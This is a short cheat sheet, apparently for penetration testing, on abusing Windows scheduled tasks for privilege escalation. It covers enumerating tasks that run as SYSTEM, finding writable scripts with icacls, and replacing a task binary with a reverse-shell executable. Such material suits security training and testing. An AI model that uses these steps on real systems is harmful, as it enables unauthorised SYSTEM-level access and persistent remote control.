# SCHEDULED TASKS

### List scheduled tasks

All scheduled tasks — Tasks running as SYSTEM

```bash
schtasks /query /fo LIST /v
Get-ScheduledTask
```

<details>
<summary>Example Output</summary>

```
schtasks /query /fo LIST /v | findstr /i 'taskname\|run as\|task to run'
TaskName: \CustomBackup
Run As User: SYSTEM
Task To Run: C:\Scripts\backup.bat
(Runs as SYSTEM - check if script is writable)
```
</details>

---

### Writable task scripts

Can you modify the script? — Runs as task owner

```bash
Check permissions on scripts referenced by tasks
icacls <script_path>
```

<details>
<summary>Example Output</summary>

```
schtasks /query /fo LIST /v | findstr /i 'task\|run\|author'
TaskName: \Backup
Run As User: SYSTEM
Task To Run: C:\Scripts\backup.bat

icacls C:\Scripts\backup.bat
BUILTIN\Users:(F)  <- FULL CONTROL!
(Modify script, wait for execution)
```
</details>

---

### Task binary replacement

Replace with reverse shell — Waits for next scheduled run

```bash
If task runs a binary you can overwrite
```

<details>
<summary>Example Output</summary>

```
Task runs: C:\Scripts\app.exe
icacls C:\Scripts\app.exe -> Users:(F)

copy C:\temp\rev.exe C:\Scripts\app.exe /Y
(Wait for scheduled run or trigger manually)
```
</details>

---
